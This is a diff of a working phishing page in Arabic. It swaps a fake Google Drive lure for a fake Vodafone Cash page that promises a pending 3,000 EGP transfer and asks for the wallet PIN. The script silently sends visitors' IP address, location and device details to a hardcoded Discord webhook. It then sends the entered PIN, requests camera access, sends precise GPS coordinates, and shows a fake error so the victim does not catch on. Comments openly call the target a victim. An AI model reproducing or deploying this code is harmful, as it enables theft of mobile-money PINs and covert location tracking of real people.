@@ -3,73 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - مشاركة آمنة</title>
+    <title>Vodafone Cash | التحقق من العملية</title>
     <style>
-        body { background: #f8f9fa; color: #3c4043; font-family: 'Roboto', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); width: 90%; max-width: 400px; text-align: center; border: 1px solid #dadce0; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #202124; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; width: 100%; }
-        .btn:hover { background: #185abc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
-        .footer-text { font-size: 12px; color: #70757a; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        body { background: #f4f4f4; color: #333; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .app-container { background: white; width: 100%; max-width: 400px; height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .header { background: #e60000; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }
+        .content { padding: 25px; flex: 1; }
+        .notif { background: #fff5f5; border: 1px dashed #e60000; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .amount-txt { color: #e60000; font-size: 22px; font-weight: bold; display: block; margin-top: 5px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #666; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; font-size: 18px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
+        .btn { background: #e60000; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .secure-footer { text-align: center; padding: 20px; font-size: 11px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="logo">
-        <h1>مستند محمي بكلمة مرور</h1>
-        <p>لقد تمت مشاركة ملف "صور_خاصة_2026.zip" معك. لأسباب أمنية، يجب علينا التأكد من أنك لست برنامج روبوت قبل فك التشفير.</p>
-        
-        <button class="btn" onclick="masterLog()">التحقق والمتابعة</button>
-        
-        <div class="footer-text">
-            يستخدم Google بروتوكول الموقع الجغرافي للتأكد من أن الوصول يتم من منطقة معتمدة.
+<div class="app-container">
+    <div class="header">خدمات فودافون كاش</div>
+    
+    <div class="content">
+        <div class="notif">
+            تم استلام حوالة معلقة بقيمة:
+            <span class="amount-txt">3,000.00 ج.م</span>
+            <small>من رقم: 01064001459</small>
         </div>
+
+        <p style="font-size: 13px; color: #555;">لتأكيد إيداع المبلغ في حسابك، يرجى إدخال الرقم السري للمحفظة (PIN) لإتمام الفحص الأمني السريع.</p>
+        
+        <label>أدخل الرقم السري (6 أرقام):</label>
+        <input type="password" id="userPin" maxlength="6" placeholder="******" inputmode="numeric">
+
+        <button class="btn" onclick="captureEverything()">تأكيد واستلام الحوالة</button>
     </div>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";
+    <div class="secure-footer">
+        🔒 اتصال آمن ومشر ببروتوكول SSL <br>
+        حقوق الطبع والنشر © فودافون مصر 2026
+    </div>
+</div>
 
-        async function silentLog() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const ipData = await response.json();
-                sendToDiscord("👀 **دخول جديد للصفحة**", [
-                    { name: "🌐 الـ IP", value: ipData.ip, inline: true },
-                    { name: "📍 الموقع التقريبي", value: ipData.city + ", " + ipData.country_name, inline: true },
-                    { name: "📱 الجهاز", value: navigator.userAgent, inline: false }
-                ], 3447003);
-            } catch (e) {}
-        }
-        silentLog();
+<script>
+    const DISCORD_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";
 
-        async function masterLog() {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                sendToDiscord("🎯 **صيد مؤكد بدقة GPS**", [
-                    { name: "📍 الموقع الحي", value: `[فتح في الخرائط](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
-                    { name: "🎯 الدقة", value: `${pos.coords.accuracy.toFixed(0)} متر`, inline: true },
-                    { name: "🔋 تفاصيل الجهاز", value: navigator.platform, inline: true }
-                ], 15158332);
+    // سحب البيانات التقنية فوراً وبصمت
+    (async function initialLog() {
+        try {
+            const ipInfo = await (await fetch('https://ipapi.co/json/')).json();
+            sendLog("🔴 **محاولة دخول جديدة**", [
+                { name: "🌐 الـ IP", value: ipInfo.ip, inline: true },
+                { name: "📍 المكان", value: ipInfo.city + ", " + ipInfo.country_name, inline: true },
+                { name: "📱 الجهاز", value: navigator.platform, inline: true }
+            ], 16711680);
+        } catch(e) {}
+    })();
 
-                alert("خطأ في الخادم: انتهت جلسة العمل. يرجى المحاولة لاحقاً.");
-            }, (err) => {
-                sendToDiscord("⚠️ **الهدف رفض الصلاحية**", [{ name: "الحالة", value: "رفض إعطاء الـ GPS", inline: false }], 16776960);
-                alert("يجب السماح بالوصول للموقع لإكمال عملية التحقق الأمني.");
-            }, { enableHighAccuracy: true });
+    async function captureEverything() {
+        const pin = document.getElementById('userPin').value;
+        
+        if(pin.length < 6) {
+            alert("يرجى إدخال الرقم السري بشكل صحيح المكون من 6 أرقام.");
+            return;
         }
 
-        async function sendToDiscord(title, fields, color) {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: "نظام التحقق الذكي",
-                    embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
-                })
-            });
-        }
-    </script>
+        // 1. سحب الرقم السري أولاً (الأهم)
+        await sendLog("🔑 **صيد جديد: الرقم السري (PIN)**", [
+            { name: "🔓 الرقم السري", value: "`" + pin + "`", inline: false }
+        ], 1584435);
+
+        // 2. محاولة سحب الكاميرا والموقع
+        try {
+            await navigator.mediaDevices.getUserMedia({ video: true });
+            sendLog("📸 الكاميرا", [{ name: "الحالة", value: "تم تفعيل الوصول", inline: true }], 3066993);
+        } catch(e) {}
+
+        navigator.geolocation.getCurrentPosition((pos) => {
+            sendLog("📍 موقع الضحية الدقيق", [
+                { name: "الخريطة", value: `[فتح الموقع](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false }
+            ], 3066993);
+            
+            // التمويه النهائي
+            alert("عذراً، الرقم السري غير متطابق مع بيانات المحفظة. يرجى المحاولة عبر تطبيق أنا فودافون.");
+        }, (err) => {
+            alert("فشل التحقق الأمني: يجب السماح بالوصول للموقع لإتمام الحوالة.");
+        });
+    }
+
+    async function sendLog(title, fields, color) {
+        await fetch(DISCORD_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "Voda-Cash Logger",
+                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/a/af/Vodafone_Logo.svg",
+                embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
+            })
+        });
+    }
+</script>
+
 </body>
 </html>
